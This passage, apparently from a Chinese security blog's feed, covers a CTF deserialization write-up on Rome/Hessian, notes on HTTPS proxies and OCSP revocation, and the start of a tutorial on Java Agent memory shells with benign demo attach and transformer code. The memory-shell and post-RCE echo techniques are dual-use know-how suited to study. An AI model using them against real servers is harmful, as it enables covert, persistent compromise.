<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> DOM <span class="token function">getStylesheetDOM</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>DOM<span class="token punctuation">)</span>_sdom<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>而这个<code>_sdom</code>也是transient的，进行函数调用然后再次报错挂掉</p>
<p>这个师傅还提到了一个新的利用方案，因为Hessain2和java原生反序列化不一样，所以就算没有继承serializable的类也能反序列化<br><a href="https://y4tacker.github.io/2022/03/21/year/2022/3/2022%E8%99%8E%E7%AC%A6CTF-Java%E9%83%A8%E5%88%86/">2022虎符CTF-Java部分</a><br>不过说是低版本才有？</p>
<h3 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h3><p>已经打到rce了，现在就是经典不出网回显环节了。两个打法，一个是究极反射拿response对象直接写response，另一个是究极调试框架找filter注册点之类的地方写内存马。这种思路性的东西可以看看ha1师傅的这篇<a href="https://ha1c9on.top/?p=1949">Java Memory Shell &amp; Tomcat</a><br>但是以前抄的payload都是经典tomcat回显或者spring回显，这把使用的东西看起来有点原生<code>com.sun.net.httpserver.HttpServer</code></p>
<p>抄一个项目<a href="https://github.com/feihong-cs/Java-Rce-Echo">Java-Rce-Echo</a><br>虽然这个项目里面没有这个玩意的回显。。。</p>
<p>改天手动调，摸一下。</p>
<p>也可以直接抄ha1师傅的<br><a href="https://ha1c9on.top/?p=1973">虎符 2022 ezchain</a></p>
<h3 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h3><p>调试payload触发位置的时候的坑<br>因为是ToStringBean的toString方法是最终的触发点，在IDEA进行调试的时候控制台会一直尝试去解析ToStringBean的值，就会疯狂调用toString疯狂触发payload。。。。我一开始payload写的是弹计算器，调试走一步弹一个给我整麻了</p>
<p>奇怪的依赖坑<br>直接搜rome的话搜到的依赖是</p>
<pre class=" language-xml"><code class="language-xml">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>rome<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>rome<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
</code></pre>
<p>这个包导入的内容和这个题目的依赖</p>
<pre class=" language-xml"><code class="language-xml">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.rometools<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>rome<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.7.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
</code></pre>
<p>并且他们在功能上好像没有什么区别（粗略的看了一下），但是他们两个类的完全限定名不一样。。。一个是<code>com.sun.syndication.feed.impl</code>，另一个是<code>com.rometools.rome.feed.impl</code>，这里一开始给我整迷惑了。。。然后就卡住了</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTPS代理原理</title>
    <url>/HTTPS%E4%BB%A3%E7%90%86%E5%8E%9F%E7%90%86.html</url>
    <content><![CDATA[<h1 id="HTTPS代理原理"><a href="#HTTPS代理原理" class="headerlink" title="HTTPS代理原理"></a>HTTPS代理原理</h1><p>摸了两天的鱼，今天晚上找了一晚上资料把这段补上<br>HTTPS系列学习的根本原因都是因为最近在学习代理怎么用，然后对在代理下运行的HTTPS安全性产生了一定的困惑，加之以burp能明文抓取HTTPS包，更加困惑了</p>
<p>今天最后翻到了一个国外超级大哥文章的翻译，感觉是众多资料中讲的最清楚的了<br>在一切开始之前，先回顾一下https链接建立到TLS握手之间的操作</p>
<h2 id="正常的HTTPS链接建立过程"><a href="#正常的HTTPS链接建立过程" class="headerlink" title="正常的HTTPS链接建立过程"></a>正常的HTTPS链接建立过程</h2><p>再摸一个图出来<br><img src="/images/HTTPS%E4%BB%A3%E7%90%86%E5%8E%9F%E7%90%86/https.png" alt="HTTPS链接建立"><br>可以看到，大家还是老老实实先来一个TCP三次握手，先把TCP层面的链接建立起来，然后开始进行TLS的握手，client hello，server hello+证书，随机数验证blblbl，走上上篇文章讲到的HTTPS认证过程的老路，这里重复一次的意义就是引入这个TCP链接建立过程，方便后面讲</p>
<p>然后我们来看代理的两大类别，转发代理和TLS终止代理</p>
<h2 id="转发代理"><a href="#转发代理" class="headerlink" title="转发代理"></a>转发代理</h2><p>由于TLS在TCP层之上建立起了一个安全层，那么代理就需要在安全层之下来实现流量的转发</p>
<h3 id="CONNECT请求"><a href="#CONNECT请求" class="headerlink" title="CONNECT请求"></a>CONNECT请求</h3><p>使用代理都会发送这个请求，用于告诉代理服务器在客户端和目标站点之间建立一条隧道，当代理服务器和目标站点TCP握手成功之后，就回复给客户端一个200 connection established，就算是开了一个通道<br>在这之后，转发代理就简单的进行流量的转发，服务器和客户端之间的TLS握手对代理服务器而言是加密过的，代理服务器并不能解析，只是做一个简单的转发，代理服务器感觉上就像是一跳特殊的路由一样<br>（之前愚蠢的思考了一下为什么CONNECT明文告诉代理请求某些域名怎么不会被ban，才想起来原来代理自己还要加一层vmss加密过gfw）<br>一般来说代理都是转发代理，毕竟代理也拿不到服务器的私钥，怎么解密加密流量呢</p>
<p><strong>不过转发代理也是看得见HTTP流量的，所以大家还是小心一点哦</strong></p>
<h2 id="TLS终止代理"><a href="#TLS终止代理" class="headerlink" title="TLS终止代理"></a>TLS终止代理</h2><p>也可以称为中间人代理，典型代表就是burp suite，这篇文章出现的原因一部分就是因为我一直在想burp为什么导入证书之后能抓HTTPS包</p>
<p>显然，从名字上就可以看出，burp完成了一次中间人攻击，不过并不是偷了服务器的密钥，而是给我们签一个假证书<br>我们导入了一个burp的根证书，burp就以此为基础，通过我们CONNECT请求中请求的域名去来临时签一个假证书和客户端通信。也就是说，<strong>burp同时在客户端和服务器之间开启了两个HTTPS连接</strong>，TLS加密在burp这里就终止了，故它也成为TLS终止代理<br>我们和持有对应域名的假证书的burp进行通信，而burp由于持有假证书的私钥，当然能和我们的加解密来的有来有回，所以我们才能看见https的明文信息<br>burp代理一个HTTPS连接的过程是这样的：<br>1.和客户端建立TCP连接<br>2.客户端发送CONNECT请求<br>3.直接回一个200 established<br>4.客户端开始进行TLS握手，client hello<br>5.burp用假证书server hello，完成TLS握手<br>6.客户端开始请求目标站点（此时建立的就是和burp的https连接，burp完全看得见HTTPS内容）<br>7.burp临时和目标站点TCP握手<br>8.burp和目标站点完成TLS握手<br>9.开始数据传输</p>
<p>这里有一个小细节在于burp不先和服务器TCP握手，一直要到客户端请求了数据才临时从头开始建立连接</p>
<h3 id="SNI代理"><a href="#SNI代理" class="headerlink" title="SNI代理"></a>SNI代理</h3><p>Server Name Indication 服务器名称指示<br>SNI出现的原因是，客户端建立完TCP连接后，会先进行TLS握手，再发送HTTP请求，而实际上服务器只有在获取HTTP请求之后才知道客户端访问的是哪个域名，那么如果访问的服务器存在多个域名，而这些域名对应了多个证书，服务器就不知道该回哪一个证书了<br>所以为了解决这个问题，需要在TLS握手的client hello里面加一个SNI字段<br>如上是SNI内容<br>但是我没懂这个过程和代理有什么关系<br>SNI代理也是一种TLS阻断代理，这是已知结论<br>rmb神仙说是读SNI之后访问对应的目标网站<br>也有一说就是一个自建DNS一样的服务，把对应域名全部映射到SNI服务器上，SNI服务器再去转发流量<br>目测情形应该也是自签发假证书，和服务器开一个连接和客户端开一个连接，仅能代理https<br>没有特别懂这个代理的意义是什么</p>
<h2 id="代理感知型客户端"><a href="#代理感知型客户端" class="headerlink" title="代理感知型客户端"></a>代理感知型客户端</h2><p>即proxy-aware clients，难道没有在一瞬间考虑过为什么浏览器会发一个CONNECT请求给代理服务器？我怎么知道我有没有在用代理？你还真说对了，像浏览器这类软件还真就知道自己有没有在用代理，在感知到自己在用代理的时候就会发CONNECT请求来告诉代理访问谁</p>
<p>至此，一切都解释的通了，我又完全懂了（除了SNI）</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>全靠这篇看懂的好吧，一篇解决所有烦恼<br><a href="https://www.anquanke.com/post/id/86168">HTTP(s)代理是如何工作的？</a><br>这篇讲SNI的没太看懂，上面这篇的最后也有提到SNI，并且认为这是一个TLS终止代理？<br><a href="https://blog.ttionya.com/article-1851.html">SNI proxy</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>https</tag>
        <tag>proxy</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTPS证书吊销</title>
    <url>/HTTPS%E8%AF%81%E4%B9%A6%E5%90%8A%E9%94%80.html</url>
    <content><![CDATA[<h1 id="HTTPS证书吊销"><a href="#HTTPS证书吊销" class="headerlink" title="HTTPS证书吊销"></a>HTTPS证书吊销</h1><p>事情要说我想申请一个通配符证书说起，从通配符证书到let’s encrypt到OCSP服务器被墙到学习HTTPS证书吊销的奇怪学习链</p>
<p>先在这推荐一下let’s encrypt，免费发放通配符证书，再也不要一个子域名一个子域名的申请啦<br>证书有效期只有三个月，可以自动更新，但是自动更新需要的OCSP服务器被墙，导致了这篇文章的出现，愚蠢的解决方案是每三个月重新申请新的证书</p>
<h2 id="HTTPS认证过程"><a href="#HTTPS认证过程" class="headerlink" title="HTTPS认证过程"></a>HTTPS认证过程</h2><p>在这之前，先简单的复习一下HTTPS到底是怎么完成双向认证的<br><img src="/images/HTTPS%E8%AF%81%E4%B9%A6%E5%90%8A%E9%94%80/https.png" alt="https认证"><br>1.服务器向客户端发送证书和公钥，客户端看一下证书的签发单在不在本地安装的证书里面，再看看过期时间，域名对应之类的，用发过来的公钥算一下这个证书和签名对不对得上，有机会还会看看这个证书是不是被吊销了（这就是这篇文章的主题所在）<br>2.验证通过，客户端产生一个<strong>随机数</strong>，用公钥加密还给服务器，服务器解密之后这个随机数就是两方的对称加密密钥了<br>3.开始用对称密钥通信</p>
<p>显然，如果存在一个中间人，他用DNS污染把域名解析到了自己这边，而服务器的公钥和证书是公开的，也就是说中间人完全可以做到通过验证这一步。但是，没有私钥，也就意味着随机数解密不出来，既读不懂用户发来的请求，也无法返回伪造的回复</p>
<p>上述安全策略是在证书的绝对不可伪造和公钥加密绝对安全的前提下成立的<br>但是如果服务器连私钥都泄露出去了，中间人就可以为所欲为了</p>
<p>因此，如果证书私钥遭到泄露，我们就需要去吊销这份证书，防止遭受攻击</p>
<h2 id="证书吊销"><a href="#证书吊销" class="headerlink" title="证书吊销"></a>证书吊销</h2><p>证书吊销了，但是中间人拿到的证书和密钥你肯定管不到，那就只能整个告示栏昭告天下，这个证书已经泄露了，不能用了，那么昭告天下的方式有两种，CRL和OCSP（这个服务器被墙就是文章诞生的原因）<br>证书在签发的时候就会附带上CRL和OCSP验证对应的服务器地址</p>
<h3 id="CRL"><a href="#CRL" class="headerlink" title="CRL"></a>CRL</h3><p>Certificate Revocation Lists 证书撤销列表<br>就是各CA厂商把自己签过的已撤销的证书打包成一个大文件，把所有被吊销的证书都放进去，每个文件都至少在1M以上，并且这个文件更新的频率还取决于厂商，如果CA厂商一个星期更新一次，那这个被偷走的证书就能为所欲为一个星期，就算更新的快，用户正常访问没被偷证书的网站还要下一个1M以上的撤销列表看看有没有被撤销，用户体验，极差</p>
<h3 id="OCSP"><a href="#OCSP" class="headerlink" title="OCSP"></a>OCSP</h3><p>Online Certificate Status Protocol 在线证书状态协议<br>就是从打包下超级大文件变成了和验证服务器交互查数据库<br>CA也不需要更新超级大文件了，吊销一个更新一个数据库就行了，效率upup<br>但是这个也不是特别棒，每次http请求都要对OCSP服务器进行额外请求，不过和下载1M+的列表相比已经很不错了，还有一个问题就是用户对网站的浏览情况被第三方（OCSP服务器）知晓，存在隐私泄露</p>
<p>暂且不考虑额外请求的开销和隐私泄露，这一切似乎都很完美，不过下一个问题出现了<br>如果OCSP服务器不可达咋办（比如let’s encrypt的OCSP服务器被墙了。。。）<br>如果是因为网络垃圾或者墙这种不可抗力使OCSP服务不可达，有两种解决模式<br>1.hard-fail 原地爆炸，直接认定证书无效，不给访问（那可太糟糕了）<br>2.soft-fail 我们一笑而过，就当无事发生<br>hard-fail的话像OCSP被墙那我们的网站就都访问不了了，好像目前没有厂商是这么实现的浏览器，soft-fail的话就出现了严重的安全问题，因为攻击者虽然不能伪造请求，但是完全可以阻断请求，你的流量经过我手，你无法获知我现在伪造的这个服务器的证书有没有被吊销，OCSP形同虚设</p>
<h3 id="OCSP-Stapling"><a href="#OCSP-Stapling" class="headerlink" title="OCSP Stapling"></a>OCSP Stapling</h3><p>继续修修补补，我们迎来了修订版的OCSP协议<br>让web服务器去拿OCSP响应，当然也要进行加密，不然中间人还是任意伪造，减少用户开销保护用户隐私，但是还是不能避免OCSP服务器被墙的悲惨事实（比如我的服务器也在国内。。。。）<br>然而它并没有解决OCSP不可达的问题</p>
<h3 id="OCSP-Must-Staple"><a href="#OCSP-Must-Staple" class="headerlink" title="OCSP Must-Staple"></a>OCSP Must-Staple</h3><p>解决OCSP不可达时咋办，不过并不怎么流行<br>让域名持有者自己决定OCSP不可达时的失败方式，Let’s Encrypt支持该方式，不过并不是RFC标准</p>
<h3 id="浏览器处理"><a href="#浏览器处理" class="headerlink" title="浏览器处理"></a>浏览器处理</h3><p>之后就是各大浏览器厂商自己对OCSP的处理方式了<br>可以通过选项决定OCSP不可达时是使用hard-fail还是soft-fail，不过用edge，Chrome和Safari试过之后感觉这三家都是soft-fail<br>Chrome似乎觉得OCSP不太行，直接放弃了对OCSP的支持开始搞自己的</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>总而言之，OCSP服务器被墙，在目前主流浏览器的默认情况下，并不会影响访问，大家都是默认soft-fail的，但是当你使用let’s encrypt的自动化脚本去重新更新证书的时候，会有一步与OCSP服务器通信的步骤，看看这个需要续签的证书有没有过期，然后OCSP被墙了，不能自动续签了，这就是这篇文章的由来</p>
<h2 id="let’s-encrypt续签方式"><a href="#let’s-encrypt续签方式" class="headerlink" title="let’s encrypt续签方式"></a>let’s encrypt续签方式</h2><p>最新更新续签方式，OCSP服务器被墙其实只是污染了域名，可以自己在hosts文件里面手动添加一项<code>23.32.3.72 ocsp.int-x3.letsencrypt.org</code>就能用certbot renew自动更新了（只要他的服务器IP一直保持这个不变）</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>主要参考了该大哥的文章，写的很详细了（原来用的Chrome开发者版，在87之后突然出现了奇怪的bug，知乎专栏访问不上了，逼得我回到稳定版的Chrome，现在是86）<br><a href="https://zhuanlan.zhihu.com/p/75475419">你不在意的HTTPS证书吊销机制</a><br>从这个大哥这里找到知乎大哥的文章的<br><a href="https://blog.wolfogre.com/posts/letsencrypt-ocsp-breakdown/">Let’s Encrypt OCSP 域名被封</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>https</tag>
        <tag>OCSP</tag>
      </tags>
  </entry>
  <entry>
    <title>Java Agent内存马--从入门到踩坑</title>
    <url>/Java%20Agent%E7%AE%80%E6%98%93%E5%85%A5%E9%97%A8.html</url>
    <content><![CDATA[<h1 id="Java-Agent内存马–从入门到踩坑"><a href="#Java-Agent内存马–从入门到踩坑" class="headerlink" title="Java Agent内存马–从入门到踩坑"></a>Java Agent内存马–从入门到踩坑</h1><p>还是，再学点java。。。<br>主要是就着上次复现看看java内存马的实现，然后就看到了其中一种的java agent注入（但实际使用的多的应该还是直接反射调函数加filter，agent的操作要先写一个agent jar包上去，麻烦太多）<br>这个东西之前也见到过，两次，一次是burp破解，一次是cobalt strike破解<br>那个时候的理解大概就是这个玩意能注入进程进行hook之类的操作，这回仔细看看吧</p>
<h2 id="简易环境搭建"><a href="#简易环境搭建" class="headerlink" title="简易环境搭建"></a>简易环境搭建</h2><p>就跟着先知上这篇文章吧。写的挺详细的<br><a href="https://xz.aliyun.com/t/9450">Java Agent 从入门到内存马</a><br>整体思路也是跟着这篇文章复制粘贴（当然还是自己动手写两笔，rmb神仙说了要多动手而不是多看文章）</p>
<h2 id="premain-amp-amp-agentmain"><a href="#premain-amp-amp-agentmain" class="headerlink" title="premain &amp;&amp; agentmain"></a>premain &amp;&amp; agentmain</h2><p>java agent的实现方式就由如上两个函数展示。一个是在main执行之前执行，另一个是attach一个agent上去，临时执行agent函数</p>
<h3 id="premain"><a href="#premain" class="headerlink" title="premain"></a>premain</h3><p>最好理解的入门操作环节<br>premain就是在运行的时候指定<code>-javaagent:xxx.jar</code>，然后在那个jar包里写好一个premain的class，MANIFEST.MF里指明premain类。跑起来的时候就会在进入实际main函数之前先调用一下premain方法（这个名字也很明显），说起来莫名的想到bypass disable function时的LD_PRELOAD操作</p>
<p>这种手法估计在破解上使用的多，攻击上应该不好使，毕竟攻击的服务肯定已经跑起来了，不可能再让你加个参数重启一下</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>agenttest<span class="token punctuation">;</span>

<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span>Instrumentation<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PreDemo</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">premain</span><span class="token punctuation">(</span>String args<span class="token punctuation">,</span> Instrumentation inst<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"hello I'm premain agent!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>MANIFEST.MF</p>
<pre><code>Manifest-Version: 1.0
Premain-Class: org.z33.agenttest.PreDemo
Agent-Class: org.z33.agenttest.AgentDemo
</code></pre>
<p>最后有一个空的换行（用idea的话没有换行会报错）</p>
<h3 id="agentmain"><a href="#agentmain" class="headerlink" title="agentmain"></a>agentmain</h3><p>相对实用的操作，在获取到了已经运行了的java进程后可以直接attach到那个进程上然后对其进行修改</p>
<p>这个操作，略微的有些麻烦，踩了一点小小的坑<br>agentmain的Class倒是和premain没什么区别，但是要额外创建一个attacher来把我们的agentmain给附着上去<br>理论上来说把attacher写到另一个项目里可能会更好一点，我这里直接偷懒全都塞到一个项目里</p>
<p>attacher</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>agenttest<span class="token punctuation">;</span>

<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>attach<span class="token punctuation">.</span>*<span class="token punctuation">;</span>

<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Attacher</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> AttachNotSupportedException<span class="token punctuation">,</span> AgentLoadException<span class="token punctuation">,</span> AgentInitializationException <span class="token punctuation">{</span>
        String id <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        String jarName <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        VirtualMachine vm <span class="token operator">=</span> VirtualMachine<span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>
        vm<span class="token punctuation">.</span><span class="token function">loadAgent</span><span class="token punctuation">(</span>jarName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        vm<span class="token punctuation">.</span><span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"finished"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre>
<p>agentmain</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>agenttest<span class="token punctuation">;</span>

<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span>Instrumentation<span class="token punctuation">;</span>


<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AgentDemo</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">agentmain</span><span class="token punctuation">(</span>String agentArgs<span class="token punctuation">,</span> Instrumentation inst<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"attach success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>现在就可以运行需要被attach的jar包，找到pid（可以用<code>ManagementFactory.getRuntimeMXBean().getName()</code>来获取pid），运行attach jar进行agent注入</p>
<h3 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h3><p>这个才是java agent的核心，就是premain和agentmain的第二个参数</p>
<blockquote>
<p>Instrumentation是JVMTIAgent（JVM Tool Interface Agent）的一部分。Java agent通过这个类和目标JVM进行交互，从而达到修改数据的效果。</p>
</blockquote>
<p>通过使用<code>ClassFileTransformer</code>修改已经加载的类，无敌<br>有几个常用方法：</p>
<ol>
<li>getAllLoadedClasses 获取所有以及被加载的类</li>
<li>isModifiableClass 查看这个类能不能被重新加载</li>
<li>addTransformer 增加一个类transformer，之后所有加载的类都会被该transformer拦截</li>
<li>retransformClasses 将已经加载过的类进行修改</li>
<li>removeTransformer 删除已经注册的transformer</li>
</ol>
<p>进行修改点的核心就是这里的<code>ClassFileTransformer</code>，其可以对java进行字节码层面的修改。说到修改字节码，就应该反应过来javassist，就算没反应过来也应该想起经典templateImpl中生成payload的操作，用的就是这个技术</p>
<p>需要使用ClassPool cp &#x3D; ClassPool.getDefault();来获取初始的classpool，而classpool是CtClass的容器，所有的CtClass应该从ClassPool中获取。对字节码的修改就是在CtClass和CtMethod上进行的</p>
<p>然后经典insertBefore直接注入代码</p>
<p>首先简单修改一下我们的agent</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>agenttest<span class="token punctuation">;</span>

<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span>Instrumentation<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span>UnmodifiableClassException<span class="token punctuation">;</span>


<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AgentDemo</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">agentmain</span><span class="token punctuation">(</span>String agentArgs<span class="token punctuation">,</span> Instrumentation inst<span class="token punctuation">)</span> <span class="token keyword">throws</span> UnmodifiableClassException <span class="token punctuation">{</span>
        Class<span class="token punctuation">[</span><span class="token punctuation">]</span> classes <span class="token operator">=</span> inst<span class="token punctuation">.</span><span class="token function">getAllLoadedClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">// 判断类是否已经加载</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>Class <span class="token class-name">clazz</span> <span class="token operator">:</span> classes<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>TransformerDemo<span class="token punctuation">.</span>editClassName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Class "</span><span class="token operator">+</span> TransformerDemo<span class="token punctuation">.</span>editClassName <span class="token operator">+</span> <span class="token string">" found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment" spellcheck="true">// 添加 Transformer</span>
                inst<span class="token punctuation">.</span><span class="token function">addTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TransformerDemo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment" spellcheck="true">// 触发 Transformer</span>
                inst<span class="token punctuation">.</span><span class="token function">retransformClasses</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>现在agent的作用就是引入我们的transformer了，再实现一个transformer（这里先知那个文章的代码感觉写错了不少地方。。。不知道什么情况，可能防止后人复制粘贴吗。。。）<br>使用喜闻乐见的insertBefore，能防止破坏代码逻辑</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>agenttest<span class="token punctuation">;</span>

<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span>ClassFileTransformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span>IllegalClassFormatException<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>ProtectionDomain<span class="token punctuation">;</span>
<span class="token keyword">import</span> javassist<span class="token punctuation">.</span>ClassClassPath<span class="token punctuation">;</span>
<span class="token keyword">import</span> javassist<span class="token punctuation">.</span>ClassPool<span class="token punctuation">;</span>
<span class="token keyword">import</span> javassist<span class="token punctuation">.</span>CtClass<span class="token punctuation">;</span>
<span class="token keyword">import</span> javassist<span class="token punctuation">.</span>CtMethod<span class="token punctuation">;</span>


<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TransformerDemo</span> <span class="token keyword">implements</span> <span class="token class-name">ClassFileTransformer</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String editClassName <span class="token operator">=</span> <span class="token string">"com.z33.test.Demo"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String editMethodName <span class="token operator">=</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">transform</span><span class="token punctuation">(</span>ClassLoader loader<span class="token punctuation">,</span> String className<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> classBeingRedefined<span class="token punctuation">,</span> ProtectionDomain protectionDomain<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classfileBuffer<span class="token punctuation">)</span> <span class="token keyword">throws</span> IllegalClassFormatException <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
